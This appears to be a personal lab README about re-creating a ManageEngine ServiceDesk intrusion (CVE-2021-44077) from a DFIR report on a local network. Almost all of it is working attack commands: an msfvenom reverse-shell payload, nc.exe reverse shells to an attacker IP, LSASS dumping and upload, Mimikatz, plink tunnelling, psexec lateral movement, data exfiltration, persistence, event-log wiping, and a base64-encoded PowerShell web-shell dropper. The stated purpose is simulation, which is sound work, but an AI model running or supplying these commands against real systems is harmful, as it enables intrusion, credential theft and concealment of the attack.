

## 1. Hands On ActionExploiting [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) Vulnerability based on POC in [GitHub](https://github.com/horizon3ai/CVE-2021-44077)

### 1. a. in the POC msiexec.exe is created through `msfvenom`

   ```
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.134 LPORT=4444 -f exe > msiexec.exe
   ```

   b. run your listener

   ```
   nc -l 4444
   ```

   c. run the exploit script

   ```
   python3 exploit.py http://192.168.20.135:8080/ msiexec.exe
   ```

   ![CVE-Exploitation-Success](CVE-Exploitation-Success.png)

   #### But this approach isn't same as the report as in the report the Threat Actor dropped a web shell jsp file and then accessed it
   
   ![image](https://github.com/user-attachments/assets/16c25295-6f5a-465d-96b4-da499027becb)

   So, i wrote a simple python Script that when executing it, a wbsh.jsp is created a the \custom\login dir
   
   ![image](https://github.com/user-attachments/assets/a0525bc4-dc65-4c9b-9856-110ae5456b23)

   
   then used pyinstaller to convert it to exe file

   ![image](https://github.com/user-attachments/assets/cb7515a7-7eb1-49a0-b72d-5a3e834b0348)

   now we got `msiexec.exe`, let's use the exploit again

   













------

# Trash

Let's proceed step by step based on the DFIR report. The report describes the attacker’s activities following the initial exploitation. Here’s what you should do next:

### Step 1: Enumerate the System

1. **Enumerate the system to gather information.**
   Run the following commands to gather basic information about the victim machine:

   ```cmd
   ipconfig /all
   systeminfo
   query user
   query session
   ```
2. **Enable WDigest Authentication**

   As mentioned previously, enabling WDigest authentication allows the attacker to later dump credentials in plaintext. Since this step failed earlier due to the key not existing, you will need to create it:

   ```cmd
   reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
   ```

### Step 2: Drop a Web Shell

Since the web shell didn't work earlier, you need to establish a more reliable reverse shell. Let's assume you now upload `nc.exe` (Netcat) and use it to create a reverse shell.

1. **Download Netcat (if not already done)**:

   ```cmd
   powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.20.134:8080/nc.exe', 'C:\windows\temp\nc.exe')"
   ```
2. **Establish a Reverse Shell**:

   On the attacker machine, set up a listener:

   ```bash
   nc -nlvp 4444
   ```

   On the victim machine, execute the reverse shell:

   ```cmd
   C:\windows\temp\nc.exe -e cmd.exe 192.168.20.134 4444
   ```

### Step 3: Periodic Enumeration

According to the report, the attacker periodically enumerated user sessions to identify high-privilege accounts.

1. **Check user sessions periodically**:

   ```cmd
   query user
   query session
   ```

### Step 4: Dump LSASS to Obtain Credentials

On the seventh day, the attacker dumped LSASS to obtain credentials. You can use a tool like `procdump.exe` or `rundll32`.

1. **Dump LSASS using `rundll32`**:

   ```cmd
   rundll32.exe C:\windows\System32\comsvcs.dll MiniDump 640 C:\windows\temp\lsass.dmp full
   ```
2. **Exfiltrate the LSASS Dump**:

   Transfer the LSASS dump file to your attacker machine:

   ```cmd
   powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.20.134:8080/lsass.dmp', 'C:\windows\temp\lsass.dmp')"
   ```

### Step 5: Analyze LSASS Dump Locally

On your attacker machine, analyze the dump file to extract credentials using tools like Mimikatz.

1. **Use Mimikatz to extract credentials**:

   ```cmd
   mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
   ```

### Step 6: Establish Reverse SSH Tunnel for RDP Access

After obtaining credentials, establish a reverse SSH tunnel for RDP access.

1. **Download and configure `plink.exe`**:

   ```cmd
   powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.20.134:8080/plink.exe', 'C:\windows\temp\plink.exe')"
   ```
2. **Establish a reverse SSH tunnel**:

   ```cmd
   C:\windows\temp\plink.exe -ssh -P 443 -l admin -pw <password> -R 3389:127.0.0.1:3389 192.168.20.134
   ```

### Step 7: Connect via RDP

Using the tunnel, connect to the victim machine via RDP.

1. **Connect to the victim machine**:

   ```bash
   rdesktop -u <username> -p <password> 127.0.0.1:3389
   ```

### Step 8: Lateral Movement

From the beachhead, perform lateral movements to other machines using the credentials obtained.

1. **Enumerate network shares and other machines**:

   ```cmd
   net view /domain
   net group "domain computers" /domain
   ```
2. **Move laterally to other machines**:

   ```cmd
   psexec.exe \\<target-machine> cmd
   ```

### Step 9: Data Exfiltration

Exfiltrate the data of interest from the targeted machines.

1. **Exfiltrate data**:

   ```cmd
   powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.20.134:8080/exfiltrated_data.zip', 'C:\path\to\data.zip')"
   ```

### Step 10: Clean Up and Persistence

Optionally, set up persistence mechanisms and clean up traces to maintain stealth.

1. **Set up persistence**:

   ```cmd
   schtasks /create /tn "UpdateTask" /tr "C:\path\to\your\backdoor.exe" /sc daily /st 12:00
   ```
2. **Clear logs**:

   ```cmd
   wevtutil cl Application
   wevtutil cl Security
   wevtutil cl System
   ```

By following these steps, you should be able to simulate the attack detailed in the DFIR report on your local network. If you encounter any further issues, feel free to ask for additional assistance.

Enumuratins
WEB SHELL:
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/browser.jsp

Download wshell.jsp command and write it to:
C:\\Program Files (x86)\\ManageEngine\\ServiceDesk\\custom\\login\\wshell.jsp

Command:
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.20.134:9000/wshell.jsp', 'C:\Program Files (x86)\ManageEngine\ServiceDesk\custom\login\wshell.jsp')"

Encoded:

powershell.exe -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG93ZXJzaGVsbCAtQ29tbWFuZCAiKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cDovLzE5Mi4xNjguMjAuMTM0OjkwMDAvd3NoZWxsLmpzcCcsICdDOlxQcm9ncmFtIEZpbGVzICh4ODYpXE1hbmFnZUVuZ2luZVxTZXJ2aWNlRGVza1xjdXN0b21cbG9naW5cd3NoZWxsLmpzcCcpIg==')) | Invoke-Expression"
